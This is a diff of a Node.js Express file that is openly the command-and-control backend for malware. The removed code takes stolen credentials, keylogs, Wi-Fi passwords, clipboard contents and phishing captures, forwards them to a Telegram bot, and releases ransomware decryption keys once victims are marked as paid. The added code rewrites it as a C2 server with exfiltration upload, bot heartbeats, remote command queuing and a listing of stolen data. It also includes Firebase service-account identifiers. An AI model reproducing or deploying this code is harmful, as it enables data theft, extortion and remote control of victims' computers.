@@ -1,282 +1,254 @@
+const express = require('express');
 const admin = require('firebase-admin');
 const crypto = require('crypto');
+const Busboy = require('busboy');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
 
-// ========== FIREBASE CONFIG ==========
-// GANTI dengan service account kamu
-const serviceAccount = {
-  "type": "service_account",
-  "project_id": "bom-kaoskaki-db",
-  "private_key_id": "418557051fa3a10205323470cb2fd7e448af6353",
-  "private_key": process.env.FIREBASE_PRIVATE_KEY_B64 ? Buffer.from(process.env.FIREBASE_PRIVATE_KEY_B64, 'base64').toString('utf8') : "-----BEGIN PRIVATE KEY-----\nYOUR_PRIVATE_KEY_HERE\n-----END PRIVATE KEY-----\n",
-  "client_email": "firebase-adminsdk-fbsvc@bom-kaoskaki-db.iam.gserviceaccount.com",
-  "client_id": "115575027255595530608",
-  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-  "token_uri": "https://oauth2.googleapis.com/token",
-  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40bom-kaoskaki-db.iam.gserviceaccount.com",
-  "universe_domain": "googleapis.com"
-};
-
-// ========== TELEGRAM CONFIG ==========
-const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
-
-// ========== INIT ==========
-if (!admin.apps.length) {
-    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
-}
+const serviceAccount = require('../firebase/serviceAccount.json');
+admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
 const db = admin.firestore();
 
-// ========== HELPER FUNCTIONS ==========
-function b64(str) { return Buffer.from(str).toString('base64'); }
-function ub64(str) { return Buffer.from(str, 'base64').toString('utf8'); }
+const app = express();
+const router = express.Router();
 
-async function sendTelegram(msg) {
+// ============ EXISTING ENDPOINTS ============
+
+router.post('/exfil', async (req, res) => {
     try {
-        const fetch = require('node-fetch');
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
-        });
-    } catch (e) { /* silently fail */ }
-}
+        const contentType = req.headers['content-type'] || '';
 
-function getClientIP(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-        req.headers['x-real-ip'] ||
-        req.connection?.remoteAddress || 'unknown';
-}
+        if (contentType.includes('multipart/form-data')) {
+            const bb = Busboy({ headers: req.headers });
+            const fields = {};
+            let fileBuffer = null;
+            let filename = '';
 
-// ========== ROUTE HANDLER ==========
-module.exports = async (req, res) => {
-    // CORS
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    if (req.method === 'OPTIONS') return res.status(200).end();
+            bb.on('file', (fieldname, file, info) => {
+                filename = info.filename;
+                const chunks = [];
+                file.on('data', (data) => chunks.push(data));
+                file.on('end', () => { fileBuffer = Buffer.concat(chunks); });
+            });
 
-    const fullUrl = req.url.startsWith('http') ? req.url : `http://${req.headers.host}${req.url}`;
-    const url = new URL(fullUrl);
-    const path = url.pathname.replace('/api/', '');
-    const typeQuery = url.searchParams.get('type');
-    const ip = getClientIP(req);
+            bb.on('field', (fieldname, val) => { fields[fieldname] = val; });
 
-    try {
-        // ========== C2 HEARTBEAT / EXFIL ==========
-        if (req.method === 'POST' && path === 'exfil') {
-            const { type, data, session_id } = req.body || {};
-            const sid = session_id || `SESS-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`;
+            bb.on('finish', async () => {
+                const sessionId = fields.session_id || fields.sessionId || 'unknown';
+                const fileType = fields.type || 'screenshot';
 
-            // Create/update session
-            const sessionRef = db.collection('sessions').doc(sid);
-            const sessionDoc = await sessionRef.get();
-
-            if (!sessionDoc.exists) {
-                await sessionRef.set({
-                    session_id: sid,
-                    first_seen: admin.firestore.FieldValue.serverTimestamp(),
-                    last_seen: admin.firestore.FieldValue.serverTimestamp(),
-                    ip: ip,
-                    user_agent: req.headers['user-agent'] || 'unknown',
-                    hostname: data?.hostname || 'unknown',
-                    username: data?.username || 'unknown',
-                    os: data?.os || 'unknown',
-                    is_paid: false,
-                    status: 'active'
+                const docRef = await db.collection('exfil').add({
+                    sessionId,
+                    type: fileType,
+                    filename: filename || `${fileType}_${Date.now()}.png`,
+                    data: fileBuffer ? fileBuffer.toString('base64') : null,
+                    timestamp: admin.firestore.FieldValue.serverTimestamp(),
+                    metadata: fields
                 });
 
-                await sendTelegram(
-                    `🔴 <b>NEW SESSION</b>\n` +
-                    `ID: <code>${sid}</code>\n` +
-                    `Host: ${data?.hostname || '?'}\n` +
-                    `User: ${data?.username || '?'}\n` +
-                    `IP: ${ip}\n` +
-                    `OS: ${data?.os || '?'}`
-                );
-            } else {
-                await sessionRef.update({
-                    last_seen: admin.firestore.FieldValue.serverTimestamp(),
-                    ip: ip
-                });
-            }
+                await db.collection('agents').doc(sessionId).set({
+                    lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
+                    lastExfilType: fileType,
+                    lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
+                }, { merge: true });
 
-            // Route data to correct collection
-            if (type === 'system_info' || type === 'spyware') {
-                await db.collection('exfil_data').add({
-                    session_id: sid, type, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-            }
-            else if (type === 'credentials') {
-                await db.collection('credentials').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-                const creds = Array.isArray(data) ? data : [data];
-                for (const c of creds) {
-                    await sendTelegram(
-                        `🔑 <b>CREDENTIAL CAPTURED</b>\n` +
-                        `Session: <code>${sid}</code>\n` +
-                        `URL: ${c.url || c.origin || '?'}\n` +
-                        `User: ${c.username || c.email || '?'}\n` +
-                        `Pass: <code>${c.password || '?'}</code>`
-                    );
-                }
-            }
-            else if (type === 'keylogger') {
-                await db.collection('keylogger').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-            }
-            else if (type === 'screenshot') {
-                await db.collection('screenshots').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-            }
-            else if (type === 'wifi') {
-                await db.collection('wifi').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-                const profiles = Array.isArray(data) ? data : [data];
-                for (const w of profiles) {
-                    await sendTelegram(
-                        `📶 <b>WIFI CREDENTIAL</b>\n` +
-                        `SSID: ${w.ssid || '?'}\n` +
-                        `Pass: <code>w.password || '?'</code>`
-                    );
-                }
-            }
-            else if (type === 'clipboard') {
-                await db.collection('clipboard').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-                if (data?.content?.length > 10) {
-                    await sendTelegram(
-                        `📋 <b>CLIPBOARD</b>\n` +
-                        `Session: <code>${sid}</code>\n` +
-                        `Content: ${data.content.substring(0, 200)}`
-                    );
-                }
-            }
-            else if (type === 'phishing') {
-                await db.collection('phishing').add({
-                    session_id: sid, data, ip,
-                    timestamp: admin.firestore.FieldValue.serverTimestamp()
-                });
-                await sendTelegram(
-                    `🎣 <b>PHISHING CREDENTIAL</b>\n` +
-                    `User: ${data?.username || '?'}\n` +
-                    `Pass: <code>${data?.password || '?'}</code>`
-                );
-            }
-            else if (type === 'heartbeat') {
-                await sessionRef.update({
-                    last_seen: admin.firestore.FieldValue.serverTimestamp()
-                });
-            }
+                res.json({ success: true, id: docRef.id });
+            });
+            bb.end(req.body);
+        } else {
+            const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+            const sessionId = data.session_id || data.sessionId || 'unknown';
 
-            return res.status(200).json({ status: 'ok', session_id: sid });
-        }
-
-        // ========== CHECK DECRYPT STATUS ==========
-        else if (req.method === 'GET' && path === 'check_decrypt') {
-            const machine_id = req.query.machine_id;
-            if (!machine_id) return res.status(400).json({ error: 'machine_id required' });
-
-            const snap = await db.collection('sessions')
-                .where('machine_id', '==', machine_id)
-                .where('is_paid', '==', true)
-                .limit(1)
-                .get();
-
-            const canDecrypt = !snap.empty;
-            return res.json({ can_decrypt: canDecrypt });
-        }
-
-        // ========== GET PRIVATE KEY ==========
-        else if (req.method === 'GET' && path === 'get_private_key') {
-            const machine_id = req.query.machine_id;
-            if (!machine_id) return res.status(400).json({ error: 'machine_id required' });
-
-            const snap = await db.collection('sessions')
-                .where('machine_id', '==', machine_id)
-                .where('is_paid', '==', true)
-                .limit(1)
-                .get();
-
-            if (snap.empty) return res.status(403).json({ error: 'Not paid' });
-
-            const doc = snap.docs[0];
-            const privateKey = doc.data().private_key;
-            return res.json({ private_key: privateKey });
-        }
-
-        // ========== DECRYPT KEY (SAVE RSA ENC KEY) ==========
-        else if (req.method === 'POST' && path === 'decrypt_key') {
-            const { machine_id, encrypted_key } = req.body;
-            if (!machine_id || !encrypted_key) return res.status(400).json({ error: 'missing fields' });
-
-            await db.collection('ransom_keys').add({
-                machine_id, encrypted_key,
+            const docRef = await db.collection('exfil').add({
+                ...data,
                 timestamp: admin.firestore.FieldValue.serverTimestamp()
             });
 
-            return res.json({ status: 'ok' });
+            await db.collection('agents').doc(sessionId).set({
+                lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
+                lastExfilType: 'json',
+                lastExfilTime: admin.firestore.FieldValue.serverTimestamp()
+            }, { merge: true });
+
+            res.json({ success: true, id: docRef.id });
         }
-
-        // ========== SESSIONS LIST ==========
-        else if (req.method === 'GET' && path === 'sessions') {
-            const snap = await db.collection('sessions').orderBy('last_seen', 'desc').limit(100).get();
-            const sessions = [];
-            snap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
-            return res.json(sessions);
-        }
-
-        // ========== PAY / MARK PAID ==========
-        else if (req.method === 'POST' && path === 'pay') {
-            const { session_id, private_key } = req.body;
-            if (!session_id) return res.status(400).json({ error: 'session_id required' });
-
-            await db.collection('sessions').doc(session_id).update({
-                is_paid: true,
-                paid_at: admin.firestore.FieldValue.serverTimestamp(),
-                private_key: private_key || null
-            });
-
-            await sendTelegram(`✅ <b>PAYMENT MARKED</b>\nSession: <code>${session_id}</code>\nPrivate key stored.`);
-            return res.json({ status: 'ok' });
-        }
-
-        // ========== GET DATA FOR DASHBOARD ==========
-        else if (req.method === 'GET' && typeQuery === 'dashboard_data') {
-            const [sessionsSnap, credsSnap, keySnap, wifiSnap] = await Promise.all([
-                db.collection('sessions').orderBy('last_seen', 'desc').limit(50).get(),
-                db.collection('credentials').orderBy('timestamp', 'desc').limit(100).get(),
-                db.collection('keylogger').orderBy('timestamp', 'desc').limit(100).get(),
-                db.collection('wifi').orderBy('timestamp', 'desc').limit(50).get()
-            ]);
-
-            const sessions = []; sessionsSnap.forEach(d => sessions.push({ id: d.id, ...d.data() }));
-            const credentials = []; credsSnap.forEach(d => credentials.push({ id: d.id, ...d.data() }));
-            const keylogs = []; keySnap.forEach(d => keylogs.push({ id: d.id, ...d.data() }));
-            const wifi = []; wifiSnap.forEach(d => wifi.push({ id: d.id, ...d.data() }));
-
-            return res.json({ sessions, credentials, keylogs, wifi });
-        }
-
-        // ========== FILE NOT FOUND ==========
-        else {
-            return res.status(404).json({ error: 'Not found' });
-        }
-
     } catch (err) {
-        console.error('Error:', err);
-        return res.status(500).json({ error: err.message });
+        console.error('Exfil error:', err);
+        res.status(500).json({ success: false, error: err.message });
     }
-};
+});
+
+router.post('/heartbeat', async (req, res) => {
+    try {
+        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+        const { session_id, hostname, username, os_info, ip, is_admin, process_id, modules } = data;
+
+        const agentData = {
+            sessionId: session_id,
+            hostname: hostname || 'unknown',
+            username: username || 'unknown',
+            os: os_info || 'unknown',
+            ip: ip || 'unknown',
+            isAdmin: is_admin || false,
+            processId: process_id || null,
+            modules: modules || [],
+            lastHeartbeat: admin.firestore.FieldValue.serverTimestamp(),
+            firstSeen: admin.firestore.FieldValue.serverTimestamp(),
+            status: 'active'
+        };
+
+        const existingDoc = await db.collection('agents').doc(session_id).get();
+        if (existingDoc.exists) {
+            delete agentData.firstSeen;
+        }
+
+        await db.collection('agents').doc(session_id).set(agentData, { merge: true });
+
+        res.json({ success: true, next_poll: 15, server_time: new Date().toISOString() });
+    } catch (err) {
+        console.error('Heartbeat error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// ============ NEW C2 ENDPOINTS ============
+
+router.get('/get_commands', async (req, res) => {
+    try {
+        const sessionId = req.query.session_id;
+        if (!sessionId) {
+            return res.status(400).json({ success: false, error: 'session_id required' });
+        }
+
+        const snapshot = await db.collection('commands')
+            .where('target_session', 'in', [sessionId, 'all'])
+            .where('status', '==', 'pending')
+            .where('scheduled_time', '<=', new Date().toISOString())
+            .orderBy('scheduled_time', 'asc')
+            .limit(10)
+            .get();
+
+        const commands = [];
+        snapshot.forEach(doc => {
+            commands.push({ id: doc.id, ...doc.data() });
+        });
+
+        res.json({ success: true, commands, count: commands.length });
+    } catch (err) {
+        console.error('Get commands error:', err);
+        res.json({ success: true, commands: [], count: 0 });
+    }
+});
+
+router.post('/send_command', async (req, res) => {
+    try {
+        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+        const { target_session, command_type, parameters, scheduled_time } = data;
+
+        if (!target_session || !command_type) {
+            return res.status(400).json({ success: false, error: 'target_session and command_type required' });
+        }
+
+        const commandDoc = {
+            target_session,
+            command_type,
+            parameters: parameters || {},
+            status: 'pending',
+            result: null,
+            created_at: admin.firestore.FieldValue.serverTimestamp(),
+            scheduled_time: scheduled_time || new Date().toISOString(),
+            created_by: data.created_by || 'dashboard'
+        };
+
+        const docRef = await db.collection('commands').add(commandDoc);
+        res.json({ success: true, command_id: docRef.id });
+    } catch (err) {
+        console.error('Send command error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+router.post('/command_complete', async (req, res) => {
+    try {
+        const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+        const { command_id, status, result, error, session_id } = data;
+
+        if (!command_id) {
+            return res.status(400).json({ success: false, error: 'command_id required' });
+        }
+
+        const updateData = {
+            status: status || 'completed',
+            completed_at: admin.firestore.FieldValue.serverTimestamp(),
+            result: result || null,
+            error: error || null,
+            completed_by: session_id || 'unknown'
+        };
+
+        await db.collection('commands').doc(command_id).update(updateData);
+
+        await db.collection('exfil').add({
+            sessionId: session_id || 'unknown',
+            type: 'command_result',
+            command_id,
+            command_type: data.command_type || 'unknown',
+            status: updateData.status,
+            result,
+            error,
+            timestamp: admin.firestore.FieldValue.serverTimestamp()
+        });
+
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Command complete error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+router.get('/agents', async (req, res) => {
+    try {
+        const snapshot = await db.collection('agents').orderBy('lastHeartbeat', 'desc').get();
+        const agents = [];
+        snapshot.forEach(doc => {
+            agents.push({ id: doc.id, ...doc.data() });
+        });
+        res.json({ success: true, agents });
+    } catch (err) {
+        console.error('List agents error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+router.delete('/agents/:id', async (req, res) => {
+    try {
+        await db.collection('agents').doc(req.params.id).delete();
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Delete agent error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+router.get('/exfil_data', async (req, res) => {
+    try {
+        const sessionId = req.query.session_id;
+        let query = db.collection('exfil').orderBy('timestamp', 'desc').limit(100);
+        if (sessionId) {
+            query = db.collection('exfil').where('sessionId', '==', sessionId).orderBy('timestamp', 'desc').limit(100);
+        }
+
+        const snapshot = await query.get();
+        const items = [];
+        snapshot.forEach(doc => {
+            items.push({ id: doc.id, ...doc.data() });
+        });
+        res.json({ success: true, data: items });
+    } catch (err) {
+        console.error('Exfil data error:', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+app.use('/api', router);
+module.exports = app;
